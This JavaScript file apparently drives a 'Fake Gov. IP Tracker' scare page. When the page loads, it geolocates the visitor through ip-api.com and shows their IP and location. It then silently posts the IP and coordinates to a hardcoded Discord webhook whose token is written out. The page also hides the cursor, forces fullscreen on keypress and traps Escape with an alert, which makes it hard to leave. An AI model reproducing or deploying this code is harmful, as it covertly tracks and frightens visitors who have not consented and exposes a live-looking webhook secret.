// Define constant strings for better readability
const constants = {
    ip: "ip",
    location: "location",
    x: "x",
    getElementsByClassName: "getElementsByClassName",
    ipApiUrl: "http://ip-api.com/json/",
    cursor: "cursor",
    style: "style",
    documentElement: "documentElement",
    none: "none",
    accept: "Accept",
    applicationJson: "application/json",
    append: "append",
    get: "GET",
    cors: "cors",
    innerHTML: "innerHTML",
    query: "query",
    city: "city",
    regionName: "regionName",
    country: "country",
    latitude: "Latitude: ",
    lat: "lat",
    longitude: " Longitude: ",
    lon: "lon",
    hash: "#",
    emptyString: "",
    replace: "replace",
    fakeGovIpTracker: "Fake Gov. IP Tracker",
    newPageVisit: "NEW PAGE VISIT!",
    ipAddress: "**IP Address: **",
    locationLabel: "\x0A\x0A**Location: **",
    redColor: "#ff0000",
    body: "body",
    then: "then",
    discordWebhookUrl: "https://discord.com/api/webhooks/1191654926510731294/amLtivfHifaGhgsfg-PyeQMTQfnb2P7RZ6FBswuJJ4051io4Cvf6V04HmnTP06bkUBRV",
    post: "post",
    stringify: "stringify",
    ok: "ok",
    json: "json",
    click: "click",
    requestFullscreen: "requestFullscreen",
    webkitRequestFullscreen: "webkitRequestFullscreen",
    msRequestFullscreen: "msRequestFullscreen",
    addEventListener: "addEventListener",
    keydown: "keydown",
    key: "key",
    escape: "Escape",
    escPressed: "esc pressed"
};

// Get DOM elements using constants
var ip = document.getElementById(constants.ip);
var loc = document.getElementById(constants.location);
var button = document.getElementsByClassName(constants.x)[0];
var ipURL = constants.ipApiUrl;

// Set cursor style
document.documentElement.style.cursor = constants.none;

// Set headers for the fetch request
let headers = new Headers();
headers.append(constants.accept, constants.applicationJson);

// Create request object
let request = new Request(ipURL, {
    method: constants.get,
    headers: headers,
    mode: constants.cors
});

// Fetch data from the API
fetch(request)
    .then(response => {
        if (response.ok) {
            return response.json();
        } else {
            throw new Error();
        }
    })
    .then(data => {
        // Update IP and location information
        ip.innerHTML = data[constants.query];
        loc.innerHTML = data[constants.city] + constants.emptyString +
                        constants.regionName + constants.emptyString +
                        data[constants.country] + constants.emptyString +
                        constants.latitude + data[constants.lat] +
                        constants.longitude + data[constants.lon];

        // Function to convert hex color to decimal
        function hexToDecimal(hexColor) {
            return parseInt(hexColor.replace(constants.hash, constants.emptyString), 16);
        }

        // Create data for Discord webhook
        var discordData = {
            author: {
                name: constants.fakeGovIpTracker
            },
            title: constants.newPageVisit,
            description: constants.locationLabel + data[constants.query] +
                         constants.latitude + data[constants.lat] +
                         constants.longitude + data[constants.lon],
            color: hexToDecimal(constants.redColor)
        };

        // Function to send data to Discord webhook
        function sendToDiscord() {
            fetch(constants.discordWebhookUrl, {
                method: constants.post,
                headers: {
                    'Accept': constants.applicationJson,
                    'Content-Type': constants.applicationJson
                },
                mode: constants.cors,
                body: JSON.stringify({
                    name: constants.fakeGovIpTracker,
                    content: constants.emptyString,
                    embeds: [discordData]
                })
            })
            .then(response => response.ok);
        }

        // Call the function to send data to Discord
        sendToDiscord();
    });

// Add event listener for fullscreen on Escape key press
document.addEventListener(constants.keydown, function (event) {
    var bodyElement = document.documentElement;
    if (bodyElement.requestFullscreen) {
        bodyElement.requestFullscreen();
    } else if (bodyElement.webkitRequestFullscreen) {
        bodyElement.webkitRequestFullscreen();
    } else if (bodyElement.msRequestFullscreen) {
        bodyElement.msRequestFullscreen();
    }
});

// Add event listener for alert on Escape key press
document.addEventListener(constants.keydown, function (event) {
    var bodyElement = document.documentElement;
    if (event.key === constants.escape) {
        alert(constants.escPressed);
    }
});